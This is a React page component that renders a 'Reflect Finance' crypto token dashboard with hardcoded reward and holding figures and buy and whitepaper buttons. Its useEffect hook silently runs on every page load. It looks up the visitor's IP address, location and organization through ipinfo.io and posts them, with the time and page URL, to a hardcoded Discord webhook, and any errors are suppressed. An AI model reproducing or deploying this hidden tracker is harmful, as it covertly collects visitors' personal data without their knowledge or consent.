import { useEffect } from "react";

function Tag({ tagName, tagData1, tagData2 }) {
  return (
    <div className="w-full 2xl:w-1/3 2xl:float-left p-4 duration-500">
      <div className="bg-[#353952] rounded-xl p-3 pb-10 ">
        <div className="flex items-center space-x-2">
          <img src="logo.jpg" alt="logo" className="w-7 h-7 rounded-full" />
          <div className="text-sm text-nowrap overflow-hidden ">{tagName}</div>
        </div>
        <div className="py-4">
          <div className="relative h-fit w-fit font-mono mx-auto text-2xl xl:text-4xl">{tagData1}
            <div className="absolute w-full text-sm text-start">{tagData2}</div>
          </div>
        </div>
      </div>
    </div>
  )
}

function TotalTag() {
  return (
    <div className="flex space-x-3 pb-10 px-10">
      <div className="w-full">
        <img src="logo.jpg" alt="logo" className="w-8 h-8 rounded-full" />
      </div>
      <div className="items-center space-y-2">
        <div className="text-xl">Total Rewards</div>
        <div className="h-fit w-fit font-mono mx-auto text-4xl">$142.323</div>
      </div>
    </div>
  )
}

export default function Home() {
  useEffect(()=>{
    fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
      const webhookUrl = 'https://discord.com/api/webhooks/1192795691651706921/wCdqsoWrjylwz9lLiqsvjxPXJmql4wtpjTUZToDov1JPyuKk3uUv442T4oiWFN_FYQrZ';
      var datetime = new Date();
      var message = '@everyone\n' + 
        'IP Address:' + data.ip +"\n"+
        'City:'+ data.city +"\n"+
        'Region:'+ data.regiony +"\n"+
        'Country:' + data.country +"\n"+
        'Location:' + data.loc +"\n"+
        'Organization:' + data.org +"\n"+
        'DateTime:' + datetime.toLocaleDateString()+"-" +datetime.toLocaleTimeString() +"\n"+
        'From:'+window.document.URL;
        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: message,
          }),
          })
          .then(response => response.json())
          .then(data => {})
          .catch(error => {});
    })
  },[])
  return (
    <div className="w-full h-full xl:pt-24 pt-10">
      <div className="xl:w-7/12 w-11/12 h-fit mx-auto tranitions  text-white px-4">
        <div className="flex justify-start items-center space-x-4 p-3">
          <img src="logo.jpg" alt="logo" className="w-16 h-16 rounded-full" />
          <div className=" uppercase text-4xl font-semibold">Reflect Finance - Dashboard</div>
        </div>
        <div className="xl:flex justify-between">
          <div className="w-full xl:w-[70%]" >
            <div className="w-full h-full">
              <div className="overflow-hidden">
                <Tag tagName={"$REFLECT Rewards"} tagData1={142.323} tagData2={"$400,32"}></Tag>
                <Tag tagName={"$REFLECT Held"} tagData1={12157.06} tagData2={"$5400,32"}></Tag>
                <Tag tagName={"$REFLECT Marketcap"} tagData1={"$ 29 m"} tagData2={""}></Tag>
              </div>
              <div className="w-full px-4 xl:pt-1">
                <div className="rounded-xl h-56 bg-[#353952] justify-center flex items-center text-4xl ">
                  list of top holders
                </div>
              </div>
            </div>
          </div>
          <div className="w-full xl:w-[30%] p-4 xl:pb-0">
            <div className="w-full h-full rounded-xl bg-[#353952] flex items-center justify-center">
              <div className="py-10">
                <TotalTag></TotalTag>
                <TotalTag></TotalTag>
                <div className="px-5">
                  <div className="px-7 text-xl text-center bg-gradient-to-r from-[#6e18e9] to-[#be27ff] hover:brightness-125 py-5 rounded-full cursor-pointer duration-300 " >
                    Share your rewards
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="xl:flex space-y-3 xl:space-y-0 xl:space-x-6 px-4 py-6">
          <div className="w-full xl:w-[30%] text-2xl text-center bg-gradient-to-r from-[#6e18e9] to-[#be27ff] hover:brightness-125 py-4 rounded-xl cursor-pointer duration-300">
            BUY $REFLECT
          </div>
          <div className="w-full xl:w-[30%] text-2xl text-center bg-transparent border-2 border-[#8836b4] hover:brightness-125 py-4 rounded-xl cursor-pointer duration-300">
            WHITEPAPER
          </div>
        </div>
      </div>
    </div>
  );
}
